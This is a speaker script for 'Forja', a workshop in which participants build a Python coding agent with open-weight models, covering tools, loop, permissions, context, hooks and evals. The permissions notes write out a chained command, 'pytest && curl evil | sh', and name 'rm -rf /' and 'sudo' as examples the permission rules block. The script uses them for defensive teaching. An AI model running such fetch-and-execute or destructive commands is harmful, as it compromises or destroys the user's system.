# Speaker script · Forja

Full speaker notes for every slide of the English deck. 🇪🇸 [Español](guion_ponente.md)


## 1. Forja: build your own coding agent  `#cover`

[0–5 min · Before you speak: terminal open with `python scripts/tasks.py demo`, clean playground (`tasks.py reset`), large font.]

SAY: "Good morning. Before I tell you anything, I want to show you where we're going to end up."

DEMO (5 min): in the demo terminal type "make the tests pass". While it works, narrate out loud:
▸ "Notice: first it searches (grep, glob), then it reads the files. It doesn't guess."
▸ "Now it wants to edit: it shows me the diff and asks for permission. I decide."
▸ "It runs the tests with bash… and tries again if they fail."
▸ When it's done: "Three bugs fixed, tests green. With a model running on this laptop, no cloud."

SAY: "This is a coding agent: the same thing the commercial tools you're probably using do. The difference is that I didn't download this one: we wrote it. And by this time tomorrow, every one of you will have your own, written by you, and you'll be able to explain every piece."

SAY: "It's called Forja. Two days, Python, open models. No closed APIs: in fact the code blocks Anthropic and OpenAI models. If your model runs on your machine, your agent runs."

TRANSITION: "First, who I am and why I'm telling you this."


## 2. Txema González Balseiro  `#quien-soy`

[1–2 min · Keep it short: credibility, not a résumé.]

SAY: "I'm Txema. I work as an architect and tech lead at Occident, part of Grupo Catalana Occidente, where I lead the mainframe modernization: thousands of COBOL programs that have to be moved to current technologies in a heavily regulated industry, insurance."

SAY: "That's where coding agents stop being a nice demo: when you have to decide what an agent may touch, what it may not, how you audit what it does and how you measure whether it works. All of that is what we're going to build today."

SAY: "I also run Inkoova, where I do consulting and training; the Agent Engineering course for senior profiles comes out of that work. I was a Microsoft MVP in AI Platform and I've been working with AI since 2017. And if any of you came from NetCoreConf, we know each other from there."

SAY (optional, to break the ice): "Raise your hand: who already uses a coding assistant or agent every day? … And who could explain what happens between typing the request and the diff appearing? … That second question is the workshop."

TRANSITION: "Let's get to the concrete goal."


## 3. By the end, everyone has their agent and knows how it works inside  `#que`

[2 min]

SAY: "When we finish, you'll leave with three things."

▸ Your tool: "A CLI called `forja`. You launch it in any repository and it works like the commercial ones: it reads, edits, runs, asks for permission, shows diffs, plans and can be undone."
▸ Your models: "It works with Ollama, vLLM, LM Studio or OpenRouter, always with open-weight models. Your code and your data don't leave your machine unless you want them to."
▸ Your judgment: "And most importantly: you'll understand every piece. When an agent fails —and they do— you'll know whether it's the model, the context, the permissions or the tool. And you'll measure it with evals instead of offering opinions."

SAY: "An idea I'm going to repeat a lot: the model is an interchangeable part. The value is in everything around it, which we call the harness. Today we build the harness."

TRANSITION: "Someone is probably thinking: why write it if open tools already exist?"


## 4. Why not just use OpenClaude, OpenCode or Aider?  `#por-que`

[2–3 min]

SAY: "Fair question: why not use something that already exists?"

▸ OpenClaude: "You may have heard of OpenClaude. It's a fork of the Claude Code source that leaked. It's interesting to look at, but in a company it's a licensing and trademark problem. We don't use it."
▸ OpenCode, Aider, Pi: "They're good products, and if you just want to use an agent, go ahead. But using them doesn't teach you why they work or how to adapt them to your rules."
▸ Public architecture: "The good news is that the architecture of these agents is publicly documented: the loop, the tools, the permissions, the hooks, the skills, MCP, the subagents. There's no magic."
▸ "So we build Forja from scratch with that architecture. About two thousand lines of Python that you understand and control."

POINT AT THE TERMINAL ON THE SLIDE: "This is what you'll see: every line with ⏺ is a tool call. By the end of today, you'll have programmed that output yourselves."

IF THEY ASK about the leak: "I won't get into that; what matters is that we don't need it."

TRANSITION: "Let's look at the full map."


## 5. Agent = model + tools + loop. Everything else is harness  `#arquitectura`

[3 min · This slide comes back in every lab: tell them to take a photo of it.]

SAY: "An agent, at its core, is three things: a model, some tools and a loop. The loop is: I ask the model, if it asks for a tool I run it, I give it back the result, and I repeat until it answers without asking for anything. That fits in ten lines, and you'll write it before lunch."

SAY: "Everything else is harness. Let's walk through the layers:"
▸ Model (lab 01): "the client that talks to Ollama or vLLM with streaming."
▸ Agent (labs 02 to 04): "the file tools, the loop and bash."
▸ Control (04, 05, 11): "permissions, approval, the CLI and being able to undo. This is what makes it usable in a real repo."
▸ Context (06 to 08): "what the model sees on each turn, how we avoid running out of window, and planning before acting."
▸ Extension (09, 10): "subagents, hooks, skills and MCP: how to adapt it to your team without touching the core."
▸ Quality (12): "evals: measuring whether a change or a model is better."

SAY: "The highlighted layer, the agent layer, is what makes it work. The others are what let you trust it."

TRANSITION: "How are we going to work?"


## 6. Tests that guide and a progressive harness  `#como-labs`

[2 min]

SAY: "Every lab follows the same rhythm."
▸ "Ten or fifteen minutes of theory with these slides and a demo with the solution."
▸ "Between 25 and 45 minutes of hands-on: in the `forja/` folder there are functions with `TODO 01.1`, `TODO 01.2`… You fill them in until that lab's tests pass: `python scripts/tasks.py test 01`."
▸ "A two-minute checkpoint: you use your real Forja and see the new capability."

SAY: "The nice thing about the design: the CLI works from lab 01. The pieces you haven't done yet are replaced by a minimal version and you'll see "lab NN pending" warnings. Every lab you complete, your agent gains something."

SAY: "If someone gets stuck, no problem: `python scripts/tasks.py catchup 05` solves the labs before 5 and you carry on with the group. Nobody gets left behind."

SAY: "The tests don't need a GPU: they use a fake model, FakeLLM, that gives scripted answers. They're fast and deterministic. You only use the real model with the CLI."

SAY: "Work in pairs: one types, the other reads the workbook and the tests. Swap every lab. And turn off the AI assistants in your editor: the goal is to understand."

TRAFFIC LIGHT: "At the start of each hands-on, hold up green, amber or red. Two thirds of the way through, whoever is on red runs catchup."


## 7. Which model for your machine  `#modelos`

[2 min · Check here who DOESN'T have the model downloaded.]

SAY: "Which model do you work with? It depends on your machine."
▸ "16 GB laptop, or Mac M1 or later, or 8 GB GPU: `qwen3:8b`. It's fine for the labs; it's small and will sometimes need retries."
▸ "Mac with 32 GB or more, or 24 GB NVIDIA GPU: `qwen3-coder:30b`. It's a mixture-of-experts model with only 3B active parameters, which is why it's fast. It's the recommended one."
▸ "16 to 24 GB GPU: `devstral` is a good alternative."
▸ "With 8 GB or CPU only: use the shared classroom server. And as plan B, OpenRouter with open models and `data_collection: deny`."

SAY: "Rule of thumb: below about 15 tokens per second, a coding agent takes forever, because every task is between 10 and 30 calls to the model."

IMPORTANT, SAY IT SLOWLY: "Essential: `OLLAMA_CONTEXT_LENGTH=32768`. With the default context, the system prompt and the tools don't fit, and the agent "forgets" it has tools. It's the number one failure."

ASK THE ROOM: "Who hasn't been able to download the model?" → write down names and send them to the shared server.


## 8. Day 1: an agent that works · Day 2: a professional harness  `#agenda`

[1–2 min]

SAY: "The agenda. Day 1: an agent that works."
▸ "Setup, streaming client, file tools, the loop, bash and permissions, and the CLI."
▸ "At 15:15 the milestone: your agent, with your model, fixes the three broken tests in the practice project. We'll write it up on the whiteboard."

SAY: "Day 2: a professional harness."
▸ "Context and AGENTS.md, compaction, planning, subagents, hooks/skills/MCP, sessions and undo, and evals."
▸ "We finish with a final project: you adapt your Forja to the way you work and prove it with numbers."

SAY: "Breaks mid-morning and mid-afternoon; lunch at one (on day 2, at 13:20)."

NOTE FOR YOU: if it's the 1-day version, say: "Today we do 00 to 05 in full; for context, planning and hooks I'll give you live demos, and the rest is in the workbook for you to do at home."

TRANSITION: "Let's start. Lab 00."


## 9. Setup and first contact  `#l00`

[Lab 00 title slide · 30 min total]

SAY: "Lab 00: setup and first contact. The goal is that in half an hour you all have three things: Ollama with a model that knows how to use tools, the repository installed and the tests running."

SAY: "Almost all the tests will come out red. That's expected: every red test is a piece you're going to write."

POINT AT THE MAP: "We're not in any layer yet: we're setting up the workshop."


## 10. A coding agent, seen from outside  `#l00-teoria`

[5 min]

SAY: "Seen from the outside, a coding agent receives two things: a natural-language request and a working directory."
▸ "It decides which tools to call: search, read, edit, run."
▸ "The harness decides what's allowed, what the model sees and how it's displayed."
▸ "And there's a model requirement: it has to support tool calling. Not every model does it well: `llama3` or `deepseek-r1:8b`, for example, don't ship a tools template in Ollama."

SAY: "To check that, we have `forja doctor`: it asks the model to call a `ping` tool. If it calls it, ✔. It also tells you how fast it runs."

TYPICAL SNAGS (say them now and you'll save yourself questions):
▸ "Ollama isn't running: `ollama serve` or open the app."
▸ "PowerShell won't let you activate the environment: `Set-ExecutionPolicy -Scope Process Bypass`."
▸ "On Windows, to see the playground tests: `cd playground` and `python -m pytest -q`."


## 11. Hands on  `#l00-practica`

[20 min · Walk around the tables.]

SAY: "Follow the steps in the lab 00 README. At the end you should see two things in red: the workshop tests, because you haven't written anything, and three failing playground tests, which are the job for your agent."

SAY: "The playground is a small invoicing project with three deliberate bugs: rounding that uses `round()` instead of commercial rounding, a due-date calculation that only handles Saturday and not Sunday, and the invoice total, which depends on both."

WHILE THEY WORK: check that everyone runs `forja doctor` with ✔. Anyone below 15 tok/s goes to the shared server (FORJA_BACKEND=openai_compat in .env).

LAB WRAP-UP: "Everyone's doctor green? Perfect. Remember what you saw in my demo at the start: that's what you'll have tomorrow."


## 12. Streaming LLM client  `#l01`

[Lab 01 title slide · 45 min]

SAY: "Lab 01: the LLM client with streaming. It's the bottom layer of the map: how we talk to the model."

SAY: "It looks trivial —an HTTP call— but here's the first serious problem of any agent: when streaming, tool calls arrive in pieces."


## 13. In streaming, tool calls arrive in pieces  `#l01-teoria`

[12 min]

WARM-UP DEMO (optional, 3 min): in a terminal, `curl` to Ollama with `"stream": true` asking for a tool. Show the raw chunks.

SAY: "Look at the slide. This is what comes over the wire. The first chunk carries `index` 0, the `id` and the tool name, with empty arguments. The following ones only carry fragments of the arguments JSON: `{"path": "fa` and then `cturas/iva.py"}`. The last one carries the token usage."

SAY: "So we need:"
▸ ToolCallAccumulator: "groups by `index` —not by id, which only comes in the first chunk—, concatenates the arguments and only parses the JSON at the end. If the model asks for two tools at once, they come with indexes 0 and 1 interleaved."
▸ ThinkFilter: "reasoning models like Qwen3 write their thinking between `<think>` and `</think>`. We don't want to show it, but the tag can arrive split: `<thi` in one chunk and `nk>` in the next. You need to keep a small buffer."
▸ Rescue: "some models, when they get confused, write the tool call as JSON text instead of using the structured field. We rescue it."
▸ Retries: "429 and 5xx errors are retried with exponential backoff. A 400 never is: it's your error and retrying it just repeats the error."

ASK THE ROOM: "Why not retry a 400?" (Answer: it's deterministic; the request is wrong.) "What does `data_collection: deny` do on OpenRouter?" (It only routes to providers that don't store or train on your data.)


## 14. Hands on: llm.py  `#l01-practica`

[30 min]

SAY: "Three TODOs in `forja/llm.py`: the accumulator, the think filter and the `stream` method with retries and `TextDelta` and `Done` events."

HINTS TO GIVE IF YOU SEE PEOPLE STUCK:
▸ "ThinkFilter: the parametrized test tries the tag cut at every position. Read which case fails."
▸ "Don't forget `flush()` at the end of the stream: whatever is left in the buffer has to be emitted."
▸ "In `stream`, request `stream_options: include_usage` to get the tokens at the end."

CHECKPOINT: "Run plain `forja`. It's already a streaming chat with your model. You'll see "lab pending" warnings: that's expected."

IF THERE'S TIME LEFT: "Measure time to first token locally versus OpenRouter."


## 15. File tools  `#l02`

[Lab 02 title slide · 60 min]

SAY: "Lab 02: file tools. It's the first half of the "agent" layer. Five tools: read, write, edit, glob and grep."

SAY: "It's the longest lab of the morning, and that makes sense: 80% of what a coding agent does is read and edit files. If these tools are badly designed, no model will fix it."


## 16. The tool description is the prompt  `#l02-teoria`

[15 min]

SAY: "First idea: the tool description IS the prompt. The model doesn't see your code; it sees the name, the description and the JSON Schema of the parameters. That's why the `@tool` decorator generates the schema from the signature and the docstring."

DEMO: with the solution, `/tools` to see the generated schema.

SAY: "Design decisions, and why:"
▸ "`read_file` numbers the lines. That way the model can say "the bug is at amounts.py:14"."
▸ "`edit_file` is an exact replacement of a piece of text that appears only ONCE. Why not a diff or line numbers? Because small models get line counts and diffs wrong. Copying a chunk of text they do well."
▸ "But careful: we number lines in `read_file` and forbid the numbers in `old_string`. It's the models' most frequent mistake: they copy the "    14→" and the edit fails."
▸ "Read before editing, and we check the modification time: if the file changed since the agent read it —because you touched it or a formatter did— the edit is rejected. We don't overwrite your work."
▸ "Errors are data. "old_string appears 3 times; add context" saves the model a step. "Not found: did you include line numbers?" teaches it."
▸ "Sandbox: every path is resolved and checked to be inside the project, symlinks included."

DEMO: an `edit_file` that fails because it copied line numbers, and the hint message.

ASK THE ROOM: "Why number lines when reading but forbid them when editing?"


## 17. Hands on: tools.py  `#l02-practica`

[40 min · Long lab: traffic light at 25 min.]

SAY: "Six TODOs across `tools.py` and `fs_tools.py`. Start with the schema and the registry; then the sandbox, write, edit and grep."

HINTS:
▸ "`ToolRegistry.execute` never raises exceptions: any error is returned as a result with `ok=False`. The loop must not break because of a tool."
▸ "`edit_file`: count the occurrences BEFORE replacing. Zero → error with a hint. More than one and no `replace_all` → error asking for context."
▸ "`Workspace.resolve`: `resolve()` first and then `is_relative_to(root)`. That covers `../` and symlinks."

CHECKPOINT: "With lab 03 pending, Forja is still a chat: you'll see the first tool call, but there's no loop to run it and give it back the result. That's next."

IF THERE'S TIME LEFT: challenges in the README (e.g. a `list_dir` tool).


## 18. The agent loop  `#l03`

[Lab 03 title slide · 45 min · Before the break; you come back at 11:30.]

SAY: "Lab 03: the loop. It's the heart. After this lab, what you have is already an agent: it thinks, acts, observes and repeats until it's done."


## 19. An agent fits in ten lines  `#l03-teoria`

[10 min · WRITE THE LOOP ON THE WHITEBOARD BEFORE SHOWING THE SLIDE.]

SAY: "An agent fits in ten lines. I'll write them on the whiteboard." (Write the while.)

SAY: "I ask the model for a response with the available tools. I add its response to the history. If it hasn't asked for any tool, it's done: I return its text. If it has asked for tools, I run them —and here, in `execute`, is where permissions will come in during lab 04—, I add each result to the history with its `tool_call_id`, and I start over."

SAY: "Every agent framework you've seen is this with more layers."

KEY POINTS:
▸ "The history is the state. Golden rule: every assistant message with `tool_calls` must be followed by one `tool` message per `tool_call_id`. If you break that pairing, almost any backend will give you a 400."
▸ "Reads in parallel, writes in order. If the model asks for three `read_file` in a row, we launch them at once; but an edit or a bash, in order and one at a time. And the results are returned in the order they were requested."
▸ "Loop detection: if the model asks for exactly the same thing three times, we stop. But first we close the pending calls with a result, so we don't break the pairing."
▸ "Possible stops: final, max_steps, loop or cancelled with Ctrl+C."

DEMO: with the solution, "summarize all the files in invoices/" → several ⏺ Read in a row, in parallel.

ASK THE ROOM: "Why only parallelize reads?" (Writes can depend on each other and bash has side effects.) "What happens if the model calls the same thing twice?" (It's not a loop until 3; sometimes re-reading after an edit is legitimate.)


## 20. Hands on: agent.py  `#l03-practica`

[30 min]

SAY: "Two TODOs in `agent.py`: `_run_calls`, which runs the calls with consecutive reads in parallel, and `run`, the full loop."

HINTS:
▸ "For parallelism, use a ThreadPoolExecutor only for groups of consecutive reads; keep an indexed results list to preserve the order."
▸ "When the loop is detected, the test checks that no tool call is left without its tool message. Close them with a text like "cancelled by loop detection"."

CHECKPOINT: "`forja --cwd playground` and ask "explain how an invoice total is calculated". You'll see glob, grep and read_file, and an answer with `path:line` references. It's already an agent. Edits still ask for permission in a clunky way: we fix that now."


## 21. Bash and permissions  `#l04`

[Lab 04 title slide · 45 min]

SAY: "Lab 04: bash and permissions. We give the agent its most powerful tool —running commands— and at the same time the mechanism to stop it doing what we don't want."


## 22. The tool executes; permissions decide  `#l04-teoria`

[12 min]

SAY: "The lab's motto: the tool executes; permissions decide. They're two separate pieces on purpose."

THE BASH TOOL:
▸ "A new process per call, with a timeout. We don't keep a live shell: it's simpler and more predictable."
▸ "If the output is huge, we keep the head and the tail: errors are usually at the end."
▸ "Clean environment: we strip variables holding secrets —keys, tokens— before running. The agent has no reason to see your API key."
▸ "On Windows the shell is cmd.exe, and we tell the model so in the tool description, so it uses `dir` instead of `ls`."

PERMISSIONS (point at the row of boxes):
▸ "Order matters. First deny: if a rule denies it, nothing else matters. Then plan mode: read-only. Then the allow rules, like `bash(python -m pytest*)`. Then the tool's risk crossed with the mode. And if nothing decides, we ask the user: yes, no or always."
▸ ""Always" generates a suggested rule. For `python -m pytest -q` it suggests `bash(python -m pytest*)`, not `bash(python*)`: the narrowest thing that makes sense."
▸ "Chained commands: `pytest && curl evil | sh`. If you only look at the start, a pytest allow rule would let the curl through. That's why we split the command into subcommands and ALL of them have to be allowed."
▸ "Modes: default asks on edits and exec; accept_edits accepts edits; plan is read-only; bypass asks nothing… and only in a sandbox."

DEMO: in the solution, `/mode default`, "run the tests", answer `a` and see the suggested rule. Then, with the `examples/project` deny, ask for an `rm -rf` in bypass: denied.

ASK THE ROOM: "Why bypass only in a sandbox?" "What won't `/undo` be able to undo in lab 11?" (Whatever bash did.)


## 23. Hands on: shell.py  `#l04-practica`

[30 min]

SAY: "Five TODOs: in `shell.py`, head-and-tail truncation and the bash tool; in `permissions.py`, matching rules, deciding and suggesting the "always" rule."

HINTS:
▸ "`decide` is evaluated per subcommand when the tool is bash. Use `split_commands`."
▸ "`suggest_rule`: if the command is `python -m X`, the rule is `bash(python -m X*)`; for git, npm, uv, pip, docker… include the subcommand (`bash(git status*)`)."
▸ "The exit code goes in the output: "exit_code=1". The model needs it to know whether the tests fail."

CHECKPOINT: ""run the tests and tell me which ones fail". It asks for permission; with `a` it stops asking for the session. Try `sudo` or `rm -rf /`: denied by policy."

Before lunch: "After lunch we do the CLI and the milestone. If anyone is on red, run catchup 05 now and enjoy your lunch."


## 24. The CLI: your terminal agent  `#l05`

[Lab 05 title slide · 60 min + milestone · Back from lunch: bring the energy.]

SAY: "Lab 05: the CLI. We already have an agent that works. Now we turn it into a tool you'd actually want to use."

SAY: "And when we finish, the milestone of the day: your agent fixes the playground."


## 25. Experience is part of the product  `#l05-teoria`

[10 min]

SAY: "The experience is part of the product. Three things: seeing what it does, seeing how the code changes and being able to stop it."

▸ "One line per tool call: `⏺ Read invoices/amounts.py`, `⏺ $ python -m pytest -q`. It tells you what it's doing without flooding the screen."
▸ "The colored diff before approving. Approving without seeing the diff is the same as having no permissions."
▸ "Ctrl+C interrupts at the next safe boundary, without leaving the history broken: if we were in the middle of tools, they get closed."
▸ "Slash commands: `/mode` to switch modes, `/tools`, `/todos`, `/context` to see how much context we've used, `/compact`, `/cost`, `/undo`, `/sessions`."
▸ "And `-p` to use it headless, from scripts or in CI: `forja -p "fix the lint"`."

SAY: "Look at the slide: "6 steps · 4 tools". That counter is going to matter to you in lab 12."


## 26. Hands on: cli.py  `#l05-practica`

[35 min]

SAY: "Four TODOs in `cli.py`: the one-line summary, coloring the diff, asking for approval with yes/no/always and the slash commands."

HINTS:
▸ "`ask_approval` receives a `read` function so it can be tested: don't call `input()` directly."
▸ "`handle_slash` with `/mode` and no argument should show the current mode, not fail."
▸ "On Windows, Ctrl+C inside `input()` raises KeyboardInterrupt: it's already handled in `repl`, don't touch it."

CHECKPOINT → MILESTONE: "`forja --cwd playground --mode accept_edits` and ask it to fix the rounding bug and check it with the tests. Look at `/tools` and `/cost`."


## 27. Your agent fixes the playground  `#hito`

[15:15 · 75 min · The most important moment of day 1.]

PREPARE: everyone runs `python scripts/tasks.py reset` to put the playground back as it was at the start.

SAY: "Day 1 milestone. Each pair, with their Forja and their model, asks it: "make all the tests pass; read AGENTS.md first". Without helping it. If it gets stuck, you can give it a hint in natural language, but write it down."

SAY: "We'll record on the whiteboard: pair, model, did it succeed?, how many steps and how long."

WHILE THEY WORK: walk around; when someone sees something odd (the model edits tests, gets into a loop, forgets the tools), put their screen on the projector and ask the room: "Which piece of the harness would fix this?"

RETRO (16:30, 10 min):
▸ "What failed more: the model or the harness?" Usually the harness: unclear errors, short context, permissions that interrupt. Say so.
▸ "Which model did best? Are you sure, or is it a gut feeling?" → "Tomorrow at three we measure it with evals and compare against this table. Don't erase it."
▸ Close the day: "Today you've built an agent that works. Tomorrow, what it takes to trust it in a real repo."


## 28. Context engineering  `#l06`

[Day 2 · 09:00 · Lab 06 title slide · 40 min]

SAY: "Good morning. Yesterday: an agent that works. Today: a professional harness. We start with context, which is what most separates a good agent from a mediocre one with the same model."

QUICK RECAP (2 min): "Who finished the milestone? What failed you the most?" Connect the answers to today's labs.


## 29. If it isn't in context, it doesn't exist  `#l06-teoria`

[12 min]

SAY: "Key idea: the system prompt is rebuilt on every turn. What isn't in the context doesn't exist for the model. There's no magic memory."

SAY: "We build it in layers, in this order:"
▸ 1 Base: "who it is, how it answers, how to use the tools, the read-before-edit rule."
▸ 2 Environment: "directory, operating system and shell, date, git branch and whether there are changes. Without the date, the model lives in its training date."
▸ 3 Instructions: "the AGENTS.md files: your personal one in `~/.forja`, the repo's and the subfolder's. The most specific one goes last, because what comes last weighs more."
▸ 4 Mode: "if you're in plan or accept_edits, we remind it."
▸ 5 Skills catalog: "name and description only; the content is loaded when needed (lab 10)."
▸ 6 @mentions: "if you write `@invoices/amounts.py`, the content is attached to the message."

DEMO (the one with the most impact): print the solution's `app.system_prompt()` and point at each layer. Then delete `playground/AGENTS.md` and repeat the rounding question: the agent goes back to using `round()`. Restore the file. "One line in AGENTS.md is worth more than switching models."

TYPICAL SNAG: "An @ that isn't a file —an email— doesn't get expanded."


## 30. Hands on: context.py  `#l06-practica`

[25 min]

SAY: "Three TODOs in `context.py`: finding the AGENTS.md files walking up the hierarchy, building the system prompt in layers and expanding the @mentions."

HINTS:
▸ "`find_instruction_files` walks up from the current directory to the repo root; return them from most general to most specific."
▸ "`expand_mentions`: only if the path exists inside the workspace; wrap it in `<file path=…>`."

CHECKPOINT: ""review @invoices/amounts.py and tell me whether it follows what AGENTS.md says". It should cite the project rules —half-up rounding, don't touch the tests— without you telling it."


## 31. Context management and compaction  `#l07`

[Lab 07 title slide · 45 min]

SAY: "Lab 07: compaction. With local models the context window is small —32k tokens— and an agent fills it fast: every file read, every test output stays in the history. It has to be managed."


## 32. Compact without breaking history  `#l07-teoria`

[12 min]

SAY: "Two strategies, from cheap to expensive."
▸ "Microcompaction, free: old tool outputs are replaced with "[result removed]". The file you read ten steps ago isn't needed in full anymore; if you need it, you read it again. We keep the tool_call / tool pair, we just empty the content."
▸ "Summary with the LLM, costs a call and loses information: when we reach 80% of the window, we ask the model to summarize the old part and we keep the last turns intact."
▸ "Critical rule: we only cut at the start of a user turn. Never between a tool call and its result, or the backend returns a 400."

SAY: "What has to survive the summary? The goal, the decisions made, the files touched, the errors found and what's left to do. If the summary loses "what's left", the agent considers the task done."

DEMO: `.forja/settings.json` with `"contextWindow": 6000`, work until the compaction note fires; `/context` before and after.

ASK THE ROOM: "How would you check that compaction doesn't make the agent worse?" → "With evals: same task with and without compaction. Lab 12."


## 33. Hands on: compaction.py  `#l07-practica`

[30 min]

SAY: "Two TODOs in `compaction.py`: `microcompact` and `compact`."

HINTS:
▸ "`microcompact` leaves the last N results intact; it empties the earlier ones."
▸ "`compact` uses `user_turn_starts` to know where it can cut. It returns the new history and whether it compacted."
▸ "The summary is inserted as a marked user message, not as system: that way the model sees it and the session stores it (lab 11)."

CHECKPOINT: ""read all the files in the project and summarize them", then `/context`, `/compact` and `/context`. The number goes down and the agent still knows what it was doing."


## 34. Plan before acting  `#l08`

[Lab 08 title slide · 45 min]

SAY: "Lab 08: plan before acting. With big models you can sometimes skip it; with local models it's what separates finishing a long task from getting lost halfway."


## 35. Plan before acting  `#l08-teoria`

[10 min]

SAY: "Follow the flow on the slide."
▸ "`--mode plan`: the agent can only read. And it's read-only because of permissions, not because we ask it politely in the prompt: if it tries to edit, the permissions layer blocks it."
▸ "It investigates with grep, read and subagents."
▸ "When it has a plan, it calls `exit_plan_mode` with the plan in markdown. You read it and approve or reject."
▸ "If you approve, it switches to accept_edits and executes."
▸ "And while it executes, it uses `todo_write` to keep a task list: pending, in progress, done."

SAY: "Why does the list work? Because it's re-injected into the system prompt on every turn. Even if the history gets compacted, the model always sees what it's done and what's left. Rule: at most one task in progress at a time."

DEMO: `--mode plan` → "add discounts to invoices, with tests". Investigation, plan, approval and execution ticking ☐ ▶ ☑.


## 36. Hands on: planning.py  `#l08-practica`

[30 min]

SAY: "Two TODOs in `planning.py`: `todo_write` with validation and `exit_plan_mode` with user approval."

HINTS:
▸ "Validation: reject lists with more than one `in_progress` task; the error goes back to the model and it corrects itself."
▸ "`exit_plan_mode` returns to the model "the user APPROVED" or "REJECTED, reason…": the wording matters, it's what the model reads."

CHECKPOINT: "`forja --cwd playground --mode plan` and ask for percentage discounts before VAT, with tests. `/todos` to see the list."


## 37. Subagents  `#l09`

[11:25 after the break · Lab 09 title slide · 45 min]

SAY: "Lab 09: subagents. The most effective way to keep your main agent from running out of context."


## 38. Delegating buys context  `#l09-teoria`

[10 min]

SAY: "Delegating is buying context. The subagent spends 30,000 tokens exploring the repository, and the main one only gets 300 back: the summary."

▸ "It's just another tool: `task`, with a description, a prompt and the agent type."
▸ "The child starts with a clean context, its own tools and its own prompt."
▸ "Profiles are defined in Markdown with frontmatter: name, description, allowed tools and the prompt. Like the reviewer on the slide."
▸ "There's one built in, `explore`, read-only. And `task` isn't allowed inside `task`: no recursion."
▸ "The most important thing: the subagent doesn't see your conversation. The prompt the main agent passes it has to be self-contained. That's why the tool description says so explicitly."

DEMO: `/context` before and after an exploration with a subagent ("use a subagent to find every place where rounding happens") versus doing the same exploration in the main agent.


## 39. Hands on: subagents.py  `#l09-practica`

[30 min]

SAY: "Two TODOs in `subagents.py`: loading profiles from Markdown and the `task` tool."

PREPARE: copy `examples/project/.forja` into the playground (on Windows: `xcopy /E /I examples\project\.forja playground\.forja`).

HINTS:
▸ "The profile catalog goes in the `task` tool description: that's how the model knows which agents exist."
▸ "The child's tools are a subset of the parent's, filtered by the profile, and always without `task`."

CHECKPOINT: "You'll see the child's tool calls prefixed with `[explore]` and the main context barely grows. Also try: "ask the reviewer to review my uncommitted changes"."


## 40. Extensibility: hooks, skills and MCP  `#l10`

[Lab 10 title slide · 70 min · The densest lab of day 2.]

SAY: "Lab 10: extensibility. Hooks, skills and MCP. It's how you adapt the agent to your team without touching its core, and it's the same convention the commercial agents use: what you learn here works there too."


## 41. AGENTS.md asks; a hook enforces  `#l10-teoria`

[15 min]

SAY: "The lab's motto: AGENTS.md asks; a hook enforces."

HOOKS:
▸ "They're commands that run at four moments: before a tool (PreToolUse), after (PostToolUse), when the user sends a message and when the agent wants to finish (Stop)."
▸ "They receive JSON on standard input with which tool and which arguments. If they exit with code 2, they block, and whatever they write to stderr goes back to the model as the explanation. Exit 1 doesn't block: it's a hook error."
▸ "Examples in the repo: a hook that blocks writing secrets and a Stop hook that won't let it finish if the tests are red. You don't ask the model nicely for that: you enforce it."

SKILLS:
▸ "A folder with a SKILL.md. Only the name and description go into the context; the body is loaded when the model decides it needs it. Progressive disclosure: you can have a hundred skills without filling the context."

MCP:
▸ "External servers, over stdio or HTTP, that provide tools. They show up as `mcp__servidor__tool` and default to exec risk: they ask for permission."

DEMO: copy `examples/project/.forja` into the playground. 1) Break a test and ask "finish": the Stop hook won't let it. 2) "commit this": it loads the conventional-commits skill. 3) "fix issue #12 and comment on it": it uses the issues MCP.


## 42. Hands on: hooks.py  `#l10-practica`

[50 min · Traffic light at 30.]

SAY: "Five TODOs: in `hooks.py`, which hooks apply and running them while translating exit codes; in `skills.py`, discovering skills and loading them; in `mcp_tools.py`, the namespaced name."

HINTS:
▸ "A hook without a matcher applies to all tools."
▸ "Hook commands run at the project root: watch out for relative paths."
▸ "Only exit 2 blocks."

CHECKPOINT: "The Stop hook won't let it finish with red tests; the agent loads the skill before committing; and the `mcp__issues__*` tools appear in `/tools`."

Before lunch: "After lunch: sessions, evals and the final project. Think over lunch about which hook or skill would be useful in your own work."


## 43. Sessions and undo  `#l11`

[14:20 · Lab 11 title slide · 35 min]

SAY: "Lab 11: sessions and undo. Short but essential for using it in a real repository: everything the agent does has to be auditable and undoable."


## 44. Auditable and reversible  `#l11-teoria`

[8 min]

▸ Transcript: "Every message is saved to one JSONL file per session in `~/.forja/sessions`. It's for two things: auditing what the agent did and resuming with `--resume`, which rebuilds the history respecting the compactions."
▸ Checkpoints: "Before every write we save the file's original content. `/undo` reverts the whole last turn: every file it touched."
▸ Limit: "What bash does can't be undone: if it deleted something or did a push, `/undo` won't fix it. That's why bash goes through permissions. The two pieces complement each other."

DEMO: an edit, `/undo`, `/sessions`, exit and `forja --resume <id>`.

ASK THE ROOM: "What would you do to be able to undo bash too?" (Git stash / automatic commits per turn, containers… a good 1-minute debate.)


## 45. Hands on: session.py  `#l11-practica`

[25 min]

SAY: "Four TODOs in `session.py`: appending to the transcript, loading it respecting the compaction markers, saving before writing and undoing."

HINTS:
▸ "`before_write` saves the original only the first time a file is touched in the turn; if the file didn't exist, record that it has to be deleted on undo."
▸ "`load`: if there's a compaction marker, the history starts there."

CHECKPOINT: ""change the default due date to 60 days", `/undo`, check that the file is back to how it was; `/sessions` and `--resume`."


## 46. Evals: measure your agent  `#l12`

[14:55 · Lab 12 title slide · 65 min · START THE INSTRUCTOR EVALS NOW, they take a while.]

ACTION: in your terminal, `python scripts/tasks.py evals --repeat 3` with two models (one after the other) so you have results by the end of the lab.

SAY: "Lab 12: evals. Until now, whenever I asked you which model did better, you all had an opinion. Now we're going to have data."


## 47. Without measurement it's all opinion  `#l12-teoria`

[12 min]

SAY: "An eval is a real task with an objective way to check whether it was done right. Look at the YAML."
▸ "Each task runs in a clean copy of the playground, in bypass mode: nobody approves anything, it's automatic."
▸ "Hidden tests: the discounts task is checked with a test the agent can't see. If it could see it, it might write code that passes that specific test and nothing else."
▸ "`forbid_changes`: "fixing" the tests by deleting or changing them doesn't count. If the agent touches `tests/`, it fails."
▸ "`answer_contains`: for questions, we check that the answer contains the fact."
▸ "`--repeat 3`: agents are stochastic. One run that goes well proves nothing."

SAY: "With this you can compare models, prompts and harness changes. Does AGENTS.md help? Does compaction hurt? Is the 30B model worth it compared to the 8B? You measure it."

ASK THE ROOM: "Which task from your day-to-day would you turn into an eval?" → seed for the final project.


## 48. Hands on: evals.py  `#l12-practica`

[40 min]

SAY: "Two TODOs in `evals.py`: `grade`, which applies the checks, and `summarize`, which computes success rate per task, steps, time and tokens."

